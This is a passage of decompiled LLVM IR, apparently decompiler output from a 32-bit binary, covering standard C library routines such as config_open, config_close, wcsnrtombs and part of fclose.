  %v1_8063f2f.pre = phi i32 [ %v0_8063efe, %dec_label_pc_8063efe.dec_label_pc_8063f16_crit_edge ], [ %v1_8063f11, %dec_label_pc_8063f08 ]
  %v4_8063f17 = phi i32 [ %v4_8063f17.pre, %dec_label_pc_8063efe.dec_label_pc_8063f16_crit_edge ], [ %v6_8063f0c, %dec_label_pc_8063f08 ]
  %v0_8063f17 = phi i32 [ %v0_8063f17.pre, %dec_label_pc_8063efe.dec_label_pc_8063f16_crit_edge ], [ %v2_8063f14, %dec_label_pc_8063f08 ]
  %v0_8063f16 = load i32, i32* @ebp, align 4
  %v1_8063f16 = add i32 %v0_8063f16, 1
  %v8_8063f16 = icmp eq i32 %v1_8063f16, 0
  store i1 %v8_8063f16, i1* %zf.global-to-local, align 1
  store i32 %v1_8063f16, i32* @ebp, align 4
  %v1_8063f17 = inttoptr i32 %v0_8063f17 to i8*
  %v2_8063f17 = load i8, i8* %v1_8063f17, align 1
  %v3_8063f17 = zext i8 %v2_8063f17 to i32
  %v5_8063f17 = and i32 %v4_8063f17, -256
  %v6_8063f17 = or i32 %v5_8063f17, %v3_8063f17
  store i32 %v6_8063f17, i32* %eax.global-to-local, align 4
  %v4_8063f19 = icmp eq i8 %v2_8063f17, 0
  store i1 %v4_8063f19, i1* %zf.global-to-local, align 1
  br i1 %v4_8063f19, label %dec_label_pc_8063f2f, label %dec_label_pc_8063f1d

dec_label_pc_8063f1d:                             ; preds = %dec_label_pc_8063e53, %dec_label_pc_8063f16
  %v1_8063f2f.pre47 = phi i32 [ %v1_8063f2f.pre, %dec_label_pc_8063f16 ], [ %v1_8063f2f.pre44, %dec_label_pc_8063e53 ]
  %v2_8063f1746 = phi i8 [ %v2_8063f17, %dec_label_pc_8063f16 ], [ %v2_8063f1737, %dec_label_pc_8063e53 ]
  %v0_8063f1745 = phi i32 [ %v0_8063f17, %dec_label_pc_8063f16 ], [ %v0_8063f1735, %dec_label_pc_8063e53 ]
  %v1_8063f1d = add i32 %v1_8063f2f.pre47, 60
  %v2_8063f1d = inttoptr i32 %v1_8063f1d to i32*
  %v3_8063f1d = load i32, i32* %v2_8063f1d, align 4
  store i32 %v3_8063f1d, i32* @edx, align 4
  %v3_8063f21 = inttoptr i32 %v3_8063f1d to i8*
  %v4_8063f21 = load i8, i8* %v3_8063f21, align 1
  %v15_8063f21 = icmp eq i8 %v2_8063f1746, %v4_8063f21
  store i1 %v15_8063f21, i1* %zf.global-to-local, align 1
  br i1 %v15_8063f21, label %dec_label_pc_8063f2f, label %dec_label_pc_8063f25

dec_label_pc_8063f25:                             ; preds = %dec_label_pc_8063f1d
  %v0_8063f25 = load i32, i32* @ebp, align 4
  %v2_8063f25 = add i32 %v1_8063f2f.pre47, 20
  %v3_8063f25 = inttoptr i32 %v2_8063f25 to i32*
  %v4_8063f25 = load i32, i32* %v3_8063f25, align 4
  %v5_8063f25 = sub i32 %v0_8063f25, %v4_8063f25
  %v11_8063f25 = xor i32 %v4_8063f25, %v0_8063f25
  %v12_8063f25 = xor i32 %v5_8063f25, %v0_8063f25
  %v13_8063f25 = and i32 %v12_8063f25, %v11_8063f25
  %v14_8063f25 = icmp slt i32 %v13_8063f25, 0
  %v15_8063f25 = icmp eq i32 %v5_8063f25, 0
  store i1 %v15_8063f25, i1* %zf.global-to-local, align 1
  %v16_8063f25 = icmp slt i32 %v5_8063f25, 0
  %v2_8063f29 = icmp eq i1 %v16_8063f25, %v14_8063f25
  br i1 %v2_8063f29, label %dec_label_pc_8063f2f, label %dec_label_pc_8063e81

dec_label_pc_8063f2f:                             ; preds = %dec_label_pc_8063f1d, %dec_label_pc_8063f25, %dec_label_pc_8063f16, %dec_label_pc_8063e53
  %v1_8063f2f.pre.lcssa = phi i32 [ %v1_8063f2f.pre44, %dec_label_pc_8063e53 ], [ %v1_8063f2f.pre, %dec_label_pc_8063f16 ], [ %v1_8063f2f.pre47, %dec_label_pc_8063f25 ], [ %v1_8063f2f.pre47, %dec_label_pc_8063f1d ]
  %v0_8063f2f = load i32, i32* @ebp, align 4
  %v2_8063f2f = add i32 %v1_8063f2f.pre.lcssa, 24
  %v3_8063f2f = inttoptr i32 %v2_8063f2f to i32*
  %v4_8063f2f = load i32, i32* %v3_8063f2f, align 4
  %v5_8063f2f = sub i32 %v0_8063f2f, %v4_8063f2f
  %v11_8063f2f = xor i32 %v4_8063f2f, %v0_8063f2f
  %v12_8063f2f = xor i32 %v5_8063f2f, %v0_8063f2f
  %v13_8063f2f = and i32 %v12_8063f2f, %v11_8063f2f
  %v14_8063f2f = icmp slt i32 %v13_8063f2f, 0
  %v15_8063f2f = icmp eq i32 %v5_8063f2f, 0
  store i1 %v15_8063f2f, i1* %zf.global-to-local, align 1
  %v16_8063f2f = icmp slt i32 %v5_8063f2f, 0
  %v2_8063f33 = icmp eq i1 %v16_8063f2f, %v14_8063f2f
  br i1 %v2_8063f33, label %dec_label_pc_8063f45, label %dec_label_pc_8063f35

dec_label_pc_8063f35:                             ; preds = %dec_label_pc_8063f2f
  %v1_8063f35 = add i32 %v1_8063f2f.pre.lcssa, 56
  %v2_8063f35 = inttoptr i32 %v1_8063f35 to i32*
  %v3_8063f35 = load i32, i32* %v2_8063f35, align 4
  %v4_8063f35 = and i32 %v3_8063f35, 1048576
  %v5_8063f35 = icmp eq i32 %v4_8063f35, 0
  store i1 %v5_8063f35, i1* %zf.global-to-local, align 1
  br i1 %v5_8063f35, label %dec_label_pc_8063cf3, label %dec_label_pc_8063f43.loopexit

dec_label_pc_8063f43.loopexit:                    ; preds = %dec_label_pc_8063d13, %dec_label_pc_8063e10, %dec_label_pc_8063f35
  %v0_8063f45.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8063f43

dec_label_pc_8063f43:                             ; preds = %dec_label_pc_8063f43.loopexit, %entry
  %v0_8063f45.pre = phi i32 [ %v0_8063f45.pre.pre, %dec_label_pc_8063f43.loopexit ], [ %v15_8063cc4, %entry ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8063f45

dec_label_pc_8063f45:                             ; preds = %dec_label_pc_8063f2f, %dec_label_pc_8063d5a, %dec_label_pc_8063f43
  %v0_8063f48 = phi i32 [ %v0_8063f48.pre, %dec_label_pc_8063d5a ], [ 0, %dec_label_pc_8063f43 ], [ %v0_8063f2f, %dec_label_pc_8063f2f ]
  %v0_8063f45 = phi i32 [ %v1_8063d6a, %dec_label_pc_8063d5a ], [ %v0_8063f45.pre, %dec_label_pc_8063f43 ], [ %v1_8063f2f.pre.lcssa, %dec_label_pc_8063f2f ]
  %v1_8063f45 = add i32 %v0_8063f45, 28
  %v9_8063f45 = icmp eq i32 %v1_8063f45, 0
  store i1 %v9_8063f45, i1* %zf.global-to-local, align 1
  store i32 %v0_8063f48, i32* %eax.global-to-local, align 4
  %v1_8063f4a = inttoptr i32 %v1_8063f45 to i32*
  %v2_8063f4a = load i32, i32* %v1_8063f4a, align 4
  store i32 %v2_8063f4a, i32* @ebx, align 4
  %v3_8063f4a = add i32 %v0_8063f45, 32
  %v1_8063f4b = inttoptr i32 %v3_8063f4a to i32*
  %v2_8063f4b = load i32, i32* %v1_8063f4b, align 4
  store i32 %v2_8063f4b, i32* @esi, align 4
  %v3_8063f4b = add i32 %v0_8063f45, 36
  %v1_8063f4c = inttoptr i32 %v3_8063f4b to i32*
  %v2_8063f4c = load i32, i32* %v1_8063f4c, align 4
  store i32 %v2_8063f4c, i32* @edi, align 4
  %v3_8063f4c = add i32 %v0_8063f45, 40
  %v1_8063f4d = inttoptr i32 %v3_8063f4c to i32*
  %v2_8063f4d = load i32, i32* %v1_8063f4d, align 4
  store i32 %v2_8063f4d, i32* @ebp, align 4
  ret i32 %v0_8063f48

; uselistorder directives
  uselistorder i32 %v0_8063f45, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8063f48, { 1, 0 }
  uselistorder i32 %v5_8063f2f, { 1, 2, 0 }
  uselistorder i32 %v5_8063f25, { 1, 2, 0 }
  uselistorder i32 %v0_8063f25, { 1, 2, 4, 0, 3 }
  uselistorder i1 %v15_8063f21, { 1, 0 }
  uselistorder i32 %v1_8063f2f.pre47, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_8063efe, { 0, 4, 3, 2, 1, 5 }
  uselistorder i1 %v15_8063eed, { 1, 0 }
  uselistorder i8 %v2_8063eeb, { 1, 0, 2 }
  uselistorder i32 %v1_8063ed3, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8063ed2, { 1, 0 }
  uselistorder i32 %v1_8063ec4, { 1, 0 }
  uselistorder i32 %v0_8063ebf, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8063ea8, { 1, 0, 2 }
  uselistorder i32 %v0_8063e9a.pre, { 10, 9, 6, 7, 8, 1, 2, 3, 4, 0, 5 }
  uselistorder i1 %v15_8063e85, { 1, 0 }
  uselistorder i1 %v15_8063e4b, { 1, 0 }
  uselistorder i32 %v6_8063e33, { 1, 0, 2 }
  uselistorder i1 %v9_8063e0b, { 1, 0 }
  uselistorder i1 %v10_8063e06, { 1, 0 }
  uselistorder i32 %v0_8063df8, { 1, 0 }
  uselistorder i32 %v0_8063ded, { 1, 0 }
  uselistorder i32 %v3_8063ddc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_8063dd4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_8063da1, { 1, 0 }
  uselistorder i32 %v4_8063d88, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_8063d53, { 5, 0, 4, 1, 2, 3 }
  uselistorder i8* %v2_8063da4, { 2, 1, 0 }
  uselistorder i32* %v2_8063d42, { 4, 5, 3, 6, 1, 2, 0 }
  uselistorder i32* %v3_8063d3c, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %v2_8063d34, { 2, 3, 4, 1, 0 }
  uselistorder i32* %v2_8063cf3, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8* %v5_8063cef, { 3, 2, 4, 1, 5, 6, 0 }
  uselistorder i32 %v1_8063cea, { 2, 3, 1, 0 }
  uselistorder i32 %v2_8063ce0, { 3, 2, 4, 1, 5, 0, 6 }
  uselistorder i32 %tmp25, { 1, 0, 3, 4, 2, 5 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 18, 19, 20, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32* %eax.global-to-local, { 2, 17, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 34, 0, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 1048576, { 2, 1, 0, 3 }
  uselistorder i32 131072, { 3, 4, 1, 2, 0 }
  uselistorder i8 -1, { 3, 4, 0, 2, 1 }
  uselistorder i32 81, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8063f45, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063f43.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8063f2f, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8063f1d, { 1, 0 }
  uselistorder label %dec_label_pc_8063f16, { 1, 0 }
  uselistorder label %dec_label_pc_8063efe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063ed3, { 1, 0 }
  uselistorder label %dec_label_pc_8063e9a, { 1, 0 }
  uselistorder label %dec_label_pc_8063e3d, { 1, 0 }
  uselistorder label %dec_label_pc_8063e10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8063e06, { 1, 0 }
  uselistorder label %dec_label_pc_8063e01, { 1, 0 }
  uselistorder label %dec_label_pc_8063dd4, { 1, 0 }
  uselistorder label %dec_label_pc_8063d34, { 1, 0 }
  uselistorder label %dec_label_pc_8063d13, { 1, 0 }
  uselistorder label %dec_label_pc_8063d06, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* %stack_var_-12, align 4
  %v0_8063f4f = load i32, i32* @ebx, align 4
  %v1_8063f57 = icmp eq i32* %arg1, null
  br i1 %v1_8063f57, label %entry.dec_label_pc_8063f88_crit_edge, label %dec_label_pc_8063f5b

entry.dec_label_pc_8063f88_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8063f88

dec_label_pc_8063f5b:                             ; preds = %entry
  %v2_8063f5e = load i32, i32* %arg1, align 4
  %v1_8063f60 = call i32 @__GI_fclose(i32 %v2_8063f5e)
  %v1_8063f68 = add i32 %tmp5, 20
  %v2_8063f68 = inttoptr i32 %v1_8063f68 to i8*
  %v3_8063f68 = load i8, i8* %v2_8063f68, align 1
  %v4_8063f68 = icmp eq i8 %v3_8063f68, 0
  br i1 %v4_8063f68, label %dec_label_pc_8063f7c, label %dec_label_pc_8063f6e

dec_label_pc_8063f6e:                             ; preds = %dec_label_pc_8063f5b
  %v1_8063f71 = add i32 %tmp5, 4
  %v2_8063f71 = inttoptr i32 %v1_8063f71 to i32*
  %v3_8063f71 = load i32, i32* %v2_8063f71, align 4
  %v1_8063f74 = call i32 @free(i32 %v3_8063f71)
  br label %dec_label_pc_8063f7c

dec_label_pc_8063f7c:                             ; preds = %dec_label_pc_8063f5b, %dec_label_pc_8063f6e
  %v2_8063f80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063f80, i32* @ecx, align 4
  store i32 %v0_8063f4f, i32* @ebx, align 4
  %v1_8063f83 = call i32 @free(i32 %tmp5)
  br label %dec_label_pc_8063f88

dec_label_pc_8063f88:                             ; preds = %entry.dec_label_pc_8063f88_crit_edge, %dec_label_pc_8063f7c
  %v2_8063f88 = phi i32 [ %tmp10, %entry.dec_label_pc_8063f88_crit_edge ], [ %v2_8063f80, %dec_label_pc_8063f7c ]
  store i32 %v0_8063f4f, i32* @ebx, align 4
  ret i32 %v2_8063f88

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* null, { 1, 2, 9, 3, 4, 10, 5, 6, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21, 7, 8 }
  uselistorder label %dec_label_pc_8063f88, { 1, 0 }
  uselistorder label %dec_label_pc_8063f7c, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8063f8c = load i32, i32* @ebx, align 4
  store i32 %v0_8063f8c, i32* %stack_var_-4, align 4
  %v2_8063f99 = call i32 @__GI_fopen(i32 %arg1, i32 ptrtoint (i32* @global_var_80703fa.1671 to i32))
  store i32 %v2_8063f99, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8063fa5 = icmp eq i32 %v2_8063f99, 0
  br i1 %v1_8063fa5, label %dec_label_pc_8063fbd, label %dec_label_pc_8063fa9

dec_label_pc_8063fa9:                             ; preds = %entry
  %v5_8063faf = call i32 @calloc(i64 1, i32 24, i32 0, i32 0)
  store i32 %v5_8063faf, i32* %eax.global-to-local, align 4
  %v1_8063fb7 = icmp eq i32 %v5_8063faf, 0
  br i1 %v1_8063fb7, label %dec_label_pc_8063fbd, label %dec_label_pc_8063fbb

dec_label_pc_8063fbb:                             ; preds = %dec_label_pc_8063fa9
  %v2_8063fbb = inttoptr i32 %v5_8063faf to i32*
  store i32 %v2_8063f99, i32* %v2_8063fbb, align 4
  %v0_8063fc0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063fbd

dec_label_pc_8063fbd:                             ; preds = %dec_label_pc_8063fa9, %entry, %dec_label_pc_8063fbb
  %v0_8063fc0 = phi i32 [ 0, %dec_label_pc_8063fa9 ], [ 0, %entry ], [ %v0_8063fc0.pre, %dec_label_pc_8063fbb ]
  %v2_8063fbf = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8063fbf, i32* @ebx, align 4
  ret i32 %v0_8063fc0

; uselistorder directives
  uselistorder i32 %v2_8063f99, { 2, 1, 0 }
  uselistorder i32 (i64, i32, i32, i32)* @calloc, { 2, 0, 1 }
  uselistorder i64 1, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8063fbd, { 2, 0, 1 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8063fcf = icmp eq i32 %tmp4, 0
  %v1_8063fd1 = icmp eq i1 %v1_8063fcf, false
  br i1 %v1_8063fd1, label %dec_label_pc_8063fd9, label %dec_label_pc_8063fd3

dec_label_pc_8063fd3:                             ; preds = %entry
  %v2_8063fd3 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8063fd9

dec_label_pc_8063fd9:                             ; preds = %entry, %dec_label_pc_8063fd3
  %v0_8063ff5 = phi i32 [ %tmp4, %entry ], [ %v2_8063fd3, %dec_label_pc_8063fd3 ]
  %v0_8063fe1 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_8063fd3 ]
  %v2_8063fd9 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8063fd9, i32* %stack_var_-8, align 4
  store i32 %v0_8063fe1, i32* %stack_var_-4, align 4
  %v2_8063ff0 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8063ff6 = inttoptr i32 %v0_8063ff5 to i8*
  %v6_8063ff6 = call i32 @__GI_wcsnrtombs(i8* %v5_8063ff6, i32 %v2_8063ff0, i32 1, i32 16, i32 %tmp)
  %v1_8064000 = icmp eq i32 %v6_8063ff6, 0
  %v3_8064002 = select i1 %v1_8064000, i32 1, i32 %v6_8063ff6
  ret i32 %v3_8064002

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8063fd9, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8064021 = inttoptr i32 %tmp to i8*
  %v6_8064021 = call i32 @__GI_wcsnrtombs(i8* %v5_8064021, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8064021
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v12_8064030 = ptrtoint i32* %stack_var_-32 to i32
  %v4_8064033 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8064033, i32* @ecx, align 4
  %v1_806403f = icmp eq i8* %arg1, null
  store i1 %v1_806403f, i1* %zf.global-to-local, align 1
  br i1 %v1_806403f, label %dec_label_pc_8064055, label %dec_label_pc_8064043

dec_label_pc_8064043:                             ; preds = %entry
  %v15_8064043 = icmp eq i32 %v4_8064033, %arg2
  store i1 %v15_8064043, i1* %zf.global-to-local, align 1
  store i32 1, i32* %edi.global-to-local, align 4
  %v1_806404c = icmp eq i1 %v15_8064043, false
  br i1 %v1_806404c, label %dec_label_pc_806405c, label %dec_label_pc_806404e

dec_label_pc_806404e:                             ; preds = %dec_label_pc_8064043
  store i32 %v12_8064030, i32* @ecx, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_806405c

dec_label_pc_8064055:                             ; preds = %entry
  store i32 %v12_8064030, i32* @ecx, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_806405c

dec_label_pc_806405c:                             ; preds = %dec_label_pc_8064043, %dec_label_pc_806404e, %dec_label_pc_8064055
  %v2_806408714 = phi i32 [ %v4_8064033, %dec_label_pc_8064043 ], [ %v12_8064030, %dec_label_pc_806404e ], [ %v12_8064030, %dec_label_pc_8064055 ]
  %v4_8064060 = phi i32 [ %arg4, %dec_label_pc_8064043 ], [ %arg4, %dec_label_pc_806404e ], [ -1, %dec_label_pc_8064055 ]
  %tmp29 = icmp ule i32 %v4_8064060, %arg3
  %v5_8064060 = select i1 %tmp29, i32 %v4_8064060, i32 %arg3
  store i32 %v5_8064060, i32* %ebp.global-to-local, align 4
  store i32 %v5_8064060, i32* %esi.global-to-local, align 4
  %v1_8064069 = inttoptr i32 %arg2 to i32*
  %v2_8064069 = load i32, i32* %v1_8064069, align 4
  store i32 %v2_8064069, i32* %ebx.global-to-local, align 4
  %v1_80640953 = icmp eq i32 %v5_8064060, 0
  store i1 %v1_80640953, i1* %zf.global-to-local, align 1
  %v1_806409710 = icmp eq i1 %v1_80640953, false
  br i1 %v1_806409710, label %dec_label_pc_806406d, label %dec_label_pc_8064099

dec_label_pc_806406d:                             ; preds = %dec_label_pc_806405c, %dec_label_pc_806408f
  %v2_8064087 = phi i32 [ %v2_8064092, %dec_label_pc_806408f ], [ %v2_806408714, %dec_label_pc_806405c ]
  %v0_806406d = phi i32 [ %v1_806408f, %dec_label_pc_806408f ], [ %v2_8064069, %dec_label_pc_806405c ]
  %v1_806406d = inttoptr i32 %v0_806406d to i32*
  %v2_806406d = load i32, i32* %v1_806406d, align 4
  %v9_806406f = icmp eq i32 %v2_806406d, 127
  store i1 %v9_806406f, i1* %zf.global-to-local, align 1
  %tmp = icmp ult i32 %v2_806406d, 128
  br i1 %tmp, label %dec_label_pc_8064085, label %dec_label_pc_8064074

dec_label_pc_8064074:                             ; preds = %dec_label_pc_806406d
  store i32 84, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80640a7

dec_label_pc_8064085:                             ; preds = %dec_label_pc_806406d
  %v3_8064085 = trunc i32 %v2_806406d to i8
  %v4_8064085 = icmp eq i8 %v3_8064085, 0
  store i1 %v4_8064085, i1* %zf.global-to-local, align 1
  %v3_8064087 = inttoptr i32 %v2_8064087 to i8*
  store i8 %v3_8064085, i8* %v3_8064087, align 1
  %v0_8064089 = load i1, i1* %zf.global-to-local, align 1
  %v1_8064089 = icmp eq i1 %v0_8064089, false
  br i1 %v1_8064089, label %dec_label_pc_806408f, label %dec_label_pc_806408b

dec_label_pc_806408b:                             ; preds = %dec_label_pc_8064085
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8064099.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8064099

dec_label_pc_806408f:                             ; preds = %dec_label_pc_8064085
  %v0_806408f = load i32, i32* %ebx.global-to-local, align 4
  %v1_806408f = add i32 %v0_806408f, 4
  store i32 %v1_806408f, i32* %ebx.global-to-local, align 4
  %v0_8064092 = load i32, i32* @ecx, align 4
  %v1_8064092 = load i32, i32* %edi.global-to-local, align 4
  %v2_8064092 = add i32 %v1_8064092, %v0_8064092
  store i32 %v2_8064092, i32* @ecx, align 4
  %v0_8064094 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064094 = add i32 %v0_8064094, -1
  %v8_8064094 = icmp eq i32 %v1_8064094, 0
  store i32 %v1_8064094, i32* %esi.global-to-local, align 4
  store i1 %v8_8064094, i1* %zf.global-to-local, align 1
  %v1_8064097 = icmp eq i1 %v8_8064094, false
  br i1 %v1_8064097, label %dec_label_pc_806406d, label %dec_label_pc_8064099

dec_label_pc_8064099:                             ; preds = %dec_label_pc_806408f, %dec_label_pc_806405c, %dec_label_pc_806408b
  %v0_80640a1 = phi i32 [ 0, %dec_label_pc_806408b ], [ %v2_8064069, %dec_label_pc_806405c ], [ %v1_806408f, %dec_label_pc_806408f ]
  %v0_8064099 = phi i32 [ %v0_8064099.pre, %dec_label_pc_806408b ], [ %v2_806408714, %dec_label_pc_806405c ], [ %v2_8064092, %dec_label_pc_806408f ]
  %v1_8064099 = load i32, i32* @esp, align 4
  %v12_8064099 = icmp eq i32 %v0_8064099, %v1_8064099
  store i1 %v12_8064099, i1* %zf.global-to-local, align 1
  br i1 %v12_8064099, label %dec_label_pc_80640a3, label %dec_label_pc_806409d

dec_label_pc_806409d:                             ; preds = %dec_label_pc_8064099
  store i32 %v0_80640a1, i32* %v1_8064069, align 4
  br label %dec_label_pc_80640a3

dec_label_pc_80640a3:                             ; preds = %dec_label_pc_8064099, %dec_label_pc_806409d
  %v0_80640a3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80640a5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80640a5 = sub i32 %v0_80640a3, %v1_80640a5
  %v12_80640a5 = icmp eq i32 %v2_80640a5, 0
  br label %dec_label_pc_80640a7

dec_label_pc_80640a7:                             ; preds = %dec_label_pc_8064074, %dec_label_pc_80640a3
  %storemerge30 = phi i1 [ %v12_80640a5, %dec_label_pc_80640a3 ], [ false, %dec_label_pc_8064074 ]
  %storemerge = phi i32 [ %v2_80640a5, %dec_label_pc_80640a3 ], [ -1, %dec_label_pc_8064074 ]
  store i1 %storemerge30, i1* %zf.global-to-local, align 1
  %v0_80640a7 = load i32, i32* @esp, align 4
  %v6_80640a7 = icmp eq i32 %v0_80640a7, -16
  store i1 %v6_80640a7, i1* %zf.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i1 %v12_8064099, { 1, 0 }
  uselistorder i32 %v1_8064094, { 1, 0 }
  uselistorder i32 %v2_8064092, { 0, 2, 1 }
  uselistorder i32 %v1_806408f, { 0, 2, 1 }
  uselistorder i32 %v2_806406d, { 2, 0, 1 }
  uselistorder i32 %v2_8064069, { 1, 0, 2 }
  uselistorder i32 %v4_8064060, { 1, 0 }
  uselistorder i32 %v2_806408714, { 1, 0 }
  uselistorder i1 %v15_8064043, { 1, 0 }
  uselistorder i32 %v4_8064033, { 1, 0, 2 }
  uselistorder i32 %v12_8064030, { 0, 1, 3, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 12, 2, 7, 3, 4, 5, 6, 0, 8, 9, 10, 11 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 127, { 0, 2, 1, 6, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80640a7, { 1, 0 }
  uselistorder label %dec_label_pc_80640a3, { 1, 0 }
  uselistorder label %dec_label_pc_8064099, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806406d, { 1, 0 }
  uselistorder label %dec_label_pc_806405c, { 2, 1, 0 }
}

define i32 @__GI_fclose(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80640b7 = add i32 %arg1, 52
  %v2_80640b7 = inttoptr i32 %v1_80640b7 to i32*
  %v3_80640b7 = load i32, i32* %v2_80640b7, align 4
  store i32 %v3_80640b7, i32* @esi, align 4
  %v1_80640ba = icmp eq i32 %v3_80640b7, 0
  %v1_80640bc = icmp eq i1 %v1_80640ba, false
  call void @__pseudo_cond_branch(i1 %v1_80640bc, i32 134627564)
  %v0_80640be = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_80640be, i32* @edx, align 4
  %v0_80640c5 = load i32, i32* @ebx, align 4
  %v1_80640c5 = add i32 %v0_80640c5, 64
  %v2_80640c5 = inttoptr i32 %v1_80640c5 to i32*
  %v3_80640c5 = load i32, i32* %v2_80640c5, align 4
  %v15_80640c5 = icmp eq i32 %v3_80640c5, %v0_80640be
  call void @__pseudo_cond_branch(i1 %v15_80640c5, i32 134627561)
  store i32 1, i32* %ecx.global-to-local, align 4
  store i32 %v3_80640b7, i32* %eax.global-to-local, align 4
  %v0_80640d1 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80640d1 = icmp eq i32 %v0_80640d1, 0
  call void @__pseudo_cond_branch(i1 %v1_80640d1, i32 134627548)
  %v0_80640db = load i32, i32* @ebx, align 4
  %v1_80640db = add i32 %v0_80640db, 56
  %v2_80640db = inttoptr i32 %v1_80640db to i32*
  %v3_80640db = load i32, i32* %v2_80640db, align 4
  %v4_80640db = load i32, i32* %ecx.global-to-local, align 4
  %v5_80640db = load i32, i32* %eax.global-to-local, align 4
  %v16_80640db = icmp eq i32 %v5_80640db, %v3_80640db
  %v23_80640db = select i1 %v16_80640db, i32 %v4_80640db, i32 %v3_80640db
  store i32 %v23_80640db, i32* %v2_80640db, align 4
  store i32 %v3_80640db, i32* %eax.global-to-local, align 4
  %v1_80640e0 = icmp eq i1 %v16_80640db, false
